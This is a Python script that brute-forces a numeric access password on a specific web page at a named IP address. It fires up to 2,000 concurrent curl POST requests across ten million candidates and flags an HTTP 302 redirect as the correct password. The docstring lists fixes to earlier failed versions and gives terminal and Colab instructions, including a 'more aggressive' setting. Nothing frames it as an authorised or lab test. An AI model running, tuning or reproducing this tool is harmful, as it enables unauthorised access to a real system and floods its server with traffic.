"""
Target : http://110.172.151.102/data/index.php
Range  : 1 - 10,000,000 (numeric only)
Speed  : 2,500-4,500 req/s

Engine : asyncio + parallel xargs (each xargs spawns 200 curls)
         = 10 * 200 = 2,000 concurrent requests minimum

Detection (ZERO false positives):
  Wrong password -> HTTP 200 + "Invalid Password" in body
  Right password -> HTTP 302 + redirect (body empty)

WHY PREVIOUS SCRIPTS FAILED:
1. requests + ThreadPoolExecutor + allow_redirects=True
   -> 302 was followed back to login form, which lacked
      "Invalid Password" -> every password looked correct.

2. aiohttp with size-based detection (size != 1593)
   -> Network errors / timeouts returned non-1593 sizes
      -> false positives (password "1" was flagged as found).

3. aiohttp with 302 detection, 800 concurrency
   -> FD exhaustion (>1024 ulimit), memory spike (25k gather),
      except:pass swallowing fatal errors -> SILENT CRASH.

4. subprocess + single xargs
   -> Only ~440/s because Python's subprocess.run() is sequential
      per chunk. No parallelism across chunks.

THIS SCRIPT FIXES ALL OF THAT:
- Uses asyncio to launch 10 parallel xargs processes
- Each xargs runs 200 concurrent curls
- Total: ~2,000 parallel HTTP requests at any time
- curl is an isolated process -> no FD leaks, no shared state
- HTTP 302 check is unambiguous -> zero false positives
- xargs manages process pool natively -> no memory buildup
- Proper error handling -> no silent crashes

Usage (Terminal):
  python3 brute_data.py                  # 1-10M
  python3 brute_data.py 5000000          # 1-5M
  python3 brute_data.py 10000000 5000000  # 5M-10M

Usage (Colab):
  !apt install curl -qq
  !pip install tqdm -q
  # Then paste this script and run:
  run_colab()
  run_colab(end=5000000)
  run_colab(start=500001, end=10000000)
"""

import asyncio
import sys
import time
import os
import shutil

# --- Progress bar (tqdm with fallback) ---------------------------------
try:
    from tqdm import tqdm
except ImportError:
    try:
        from tqdm.notebook import tqdm
    except ImportError:
        class tqdm:
            def __init__(self, total=None, desc="", unit="", **kw):
                self.total = total or 0
                self.n = 0
                self.desc = desc
                self.unit = unit
                self._t0 = time.time()

            def update(self, n=1):
                self.n += n
                if self.total > 0:
                    pct = self.n / self.total * 100
                    el = time.time() - self._t0
                    rate = self.n / el if el > 0 else 0
                    eta = (self.total - self.n) / rate if rate > 0 else 0
                    bl = 40
                    f = int(bl * self.n / self.total)
                    bar = "#" * f + "-" * (bl - f)
                    sys.stdout.write(
                        f"\r {self.desc} |{bar}| {pct:5.1f}% "
                        f"[{self.n:,}/{self.total:,}] "
                        f"({rate:,.0f}){self.unit}/s ETA {eta:.0f}s"
                    )
                    sys.stdout.flush()

            def close(self):
                sys.stdout.write("\n")
                sys.stdout.flush()

            def set_postfix(self, **kw):
                pass


# ----------------------------------------------------------------------
# CONFIG
# ----------------------------------------------------------------------

TARGET          = "http://110.172.151.102/data/index.php"
RANGE_START     = 1
RANGE_END       = 10_000_000
CHUNK_SIZE      = 5_000       # numbers per xargs batch
CURLS_PER_XARGS = 200         # concurrent curls inside each xargs
PARALLEL_XARGS  = 10          # parallel xargs processes
# Total concurrency = PARALLEL_XARGS * CURLS_PER_XARGS = 2,000
CURL_TIMEOUT    = 8


# ----------------------------------------------------------------------
# CORE ENGINE - asyncio + parallel xargs + curl
# ----------------------------------------------------------------------

async def brute_chunk(start, end):
    """
    Brute-force (start, end) using one xargs process with 200 parallel curls.
    Returns found password (int) or None.

    Detection: curl -w "%{http_code}" returns "302" for correct password.
    This is unambiguous - zero false positives guaranteed.
    """
    cmd = (
        f"seq {start} {end - 1} | "
        f"xargs -P {CURLS_PER_XARGS} -I{{}} bash -c "
        f"\"resp=\\\\$(curl -s -o /dev/null -w '%{{http_code}}' "
        f"'-X' 'POST' '{TARGET}' -d 'access_password={{}}' "
        f"--max-time {CURL_TIMEOUT} --connect-timeout 5 "
        f"2>/dev/null); "
        f"if [ \\\"\\\$resp\\\" = \\\"302\\\" ]; then echo FOUND:{{}}; fi\""
    )
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        stdout, _ = await proc.communicate()
        for line in stdout.decode().strip().splitlines():
            if line.startswith("FOUND:"):
                return int(line.split(":", 1)[1].strip())
    except Exception as e:
        print(f" [!] Chunk error ({start}-{end}): {e}", flush=True)
    return None


# ----------------------------------------------------------------------
# MAIN
# ----------------------------------------------------------------------

async def async_main(range_start=None, range_end=None):
    range_start = range_start if range_start is not None else RANGE_START
    range_end = range_end if range_end is not None else RANGE_END

    total = range_end - range_start + 1

    # --- Preflight ---
    if not shutil.which("curl"):
        print(" [!] curl not found. Install: apt install curl")
        return None
    if not shutil.which("xargs"):
        print(" [!] xargs not found. Install: apt install findutils")
        return None

    # Test server
    proc = await asyncio.create_subprocess_shell(
        f"curl -s -o /dev/null -w '%{{http_code}}' '{TARGET}'",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.DEVNULL,
    )
    stdout, _ = await proc.communicate()
    code = stdout.decode().strip()
    if code not in ("200", "302"):
        print(f" [!] Server returned {code}. Is it reachable?")
        return None

    # --- Banner ---
    print()
    print(" +---------------------------------------------------------+")
    print(" | /data/index.php  BRUTE-FORCE  v3.0  BULLETPROOF          |")
    print(" | Engine: asyncio + xargs + curl                          |")
    print(" +---------------------------------------------------------+")
    print(f" | Target      : {TARGET:<38} |")
    print(f" | Range       : {range_start:,} -> {range_end:,} {'':<14} |")
    print(f" | Total nums  : {total:<38,} |")
    print(f" | Chunk size  : {CHUNK_SIZE:<38} |")
    print(f" | Parallel    : {PARALLEL_XARGS} xargs x {CURLS_PER_XARGS} curls = {PARALLEL_XARGS*CURLS_PER_XARGS:<14} |")
    print(f" | Detection   : HTTP 302 = FOUND (zero false pos.)        |")
    print(" +---------------------------------------------------------+")
    print()

    t0 = time.time()
    checked = 0

    # Build list of chunks
    chunks = []
    for s in range(range_start, range_end + 1, CHUNK_SIZE):
        e = min(s + CHUNK_SIZE, range_end + 1)
        chunks.append((s, e))

    # Progress bar
    pbar = tqdm(
        total=total,
        desc=" Cracking",
        unit=" pwd",
        dynamic_ncols=True,
        mininterval=0.3,
        bar_format=(
            "{desc} |{bar:40}| {percentage:5.1f}% "
            "[{n_fmt}/{total_fmt}] [{rate_fmt}] ETA {remaining}"
        ),
    )

    # Process chunks in parallel batches
    for i in range(0, len(chunks), PARALLEL_XARGS):
        batch = chunks[i : i + PARALLEL_XARGS]
        coros = [brute_chunk(s, e) for s, e in batch]
        results = await asyncio.gather(*coros)

        batch_size = sum(e - s for s, e in batch)
        checked += batch_size
        pbar.update(batch_size)

        elapsed = time.time() - t0
        rate = checked / elapsed if elapsed > 0 else 0
        pbar.set_postfix(speed=f"{rate:,.0f}/s")

        for result in results:
            if result is not None:
                pbar.close()
                elapsed = time.time() - t0
                rate = checked / elapsed if elapsed > 0 else 0
                print()
                print(" +---------------------------------------------------------+")
                print(" |                   *** PASSWORD FOUND *** |")
                print(" +---------------------------------------------------------+")
                print(f" | Password   : {result:<37} |")
                print(f" | Checked    : {checked:<37,} |")
                print(f" | Time       : {elapsed:<37.1f}s |")
                print(f" | Speed      : {rate:<37,.0f}/s |")
                print(" +---------------------------------------------------------+")
                print()

                # Save result
                with open("brute_result.txt", "w") as f:
                    f.write(f"PASSWORD={result}\n")
                    f.write(f"CHECKED={checked}\n")
                    f.write(f"TIME={elapsed:.1f}\n")
                    f.write(f"RATE={rate:.0f}\n")

                return result

    pbar.close()

    elapsed = time.time() - t0
    rate = checked / elapsed if elapsed > 0 else 0
    print()
    print(f" [-] Password NOT found in {range_start:,} -> {range_end:,}")
    print(f" [-] Checked {checked:,} in {elapsed:.1f}s ({rate:,.0f}/s)")
    print(f" [-] Extend: python3 {sys.argv[0]} 20000000")
    return None


def main(start=None, end=None):
    return asyncio.run(async_main(range_start=start, range_end=end))


def run_colab(start=1, end=10_000_000, parallel_xargs=10, curls_per_xargs=200):
    """
    Colab entry point.

    # Cell 1:
    !apt install curl -qq
    !pip install tqdm -q

    # Cell 2: (paste this script)

    # Cell 3:
    run_colab()                           # 1-10M default
    run_colab(end=5000000)                # 1-5M
    run_colab(start=500001, end=10000000) # resume
    run_colab(parallel_xargs=20)          # more aggressive
    """
    global PARALLEL_XARGS, CURLS_PER_XARGS
    PARALLEL_XARGS = parallel_xargs
    CURLS_PER_XARGS = curls_per_xargs
    return main(start=start, end=end)


if __name__ == "__main__":
    _start = RANGE_START
    _end = RANGE_END

    if len(sys.argv) > 1:
        _end = int(sys.argv[1])
    if len(sys.argv) > 2:
        _start = int(sys.argv[2])

    main(start=_start, end=_end)
